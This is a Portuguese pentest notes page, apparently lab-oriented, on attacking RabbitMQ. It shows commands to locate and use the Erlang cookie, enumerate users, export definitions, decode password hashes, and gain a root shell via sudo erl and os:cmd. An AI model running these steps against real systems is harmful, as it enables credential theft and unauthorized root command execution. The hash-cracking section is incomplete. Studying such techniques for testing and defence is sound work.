É um software de código aberto que atua como um agente de mensagens. Ele permite que aplicações enviem e recebam mensagens de forma assíncrona, através de um sistema de filas.

As portas padrão utilizadas pelo RabbitMQ são a 5672 para comunicação AMQP e a 15672 para acesso à interface de gerenciamento via HTTP, embora a porta 15671 possa ser usada com HTTPS após a configuração do certificado. O RabbitMQ utiliza outras portas para comunicação interna entre nós de um cluster e para ferramentas CLI, como a 4369 (epmd), 6000-6500 (replicação de stream) e 25672 (distribuição Erlang), mas essas portas não são tipicamente expostas externamente
#### Exploit
Podemos listar os usuários do RabbitMQ com o daemon do Erlang.
```sh
$ epmd -names
```

Para nos comunicarmos com o Erlang, precisamos do seu cookie. Costuma estar no arquivo `.erlang.cookie`.
```sh
$ find / -name *.erlang.cookie* 2>/dev/null
```
#### Emitindo comandos para o Erlang
Para emitirmos comandos ao daemon do Erlang podemos usar o `rabbitmqctl`, normalmente esse utilitário só pode ser usado pelo root e pelo usuário do rabbitmq. Nesse exemplo admitimos que o usuário seja o `rabbit`, o cookie é `UdEX5rcSZi5pg0ow` e o host é o `forge`.

Aqui verificamos o status do daemon.
```sh
$ rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge status
```

Aqui listamos os usuários.
```sh
$ rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge list_users
```

Aqui exportamos as definições do Erlang para algum arquivo json.
```sh
rabbitmqctl --erlang-cookie 'UdEX5rcSZi5pg0ow' --node rabbit@forge export_definitions /tmp/definitions.json
```
#### Cracking password
Caso tenha alguma hash armazenada nas definitions podemos quebra-la de forma simples, de acordo com a [documentação do rabbitmq](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm) a hash é estruturada assim : **`base64(<4 byte salt> + sha256(<4 byte salt> + <password>))`**.

Podemos quebra-lo assim.
```sh
$ echo -n '49e6[REDACTED]BzWF' | base64 -d | xxd -p -c 100
`   e3d7ba85295d1d16[REDACTED]98073585   `
```
Depois podemos removemos os 4 bytes utilizados como salt.
```sh
295d1d16[REDACTED]98073585
```
### erl
Se quisermos nos conectar ao RabbitMQ, podemos usar o cookie, após nos conectar podemos emitir comandos no terminal do host. Esse tipo de exploração só faz sentido caso conseguirmos executar o `erl` com um usuário mais elevado com `sudo` ou um `suid`.

```sh
$ sudo erl -cookie 'UdEX5rcSZi5pg0ow' -sname rabbit@forge
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(rabbit@forge)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```



















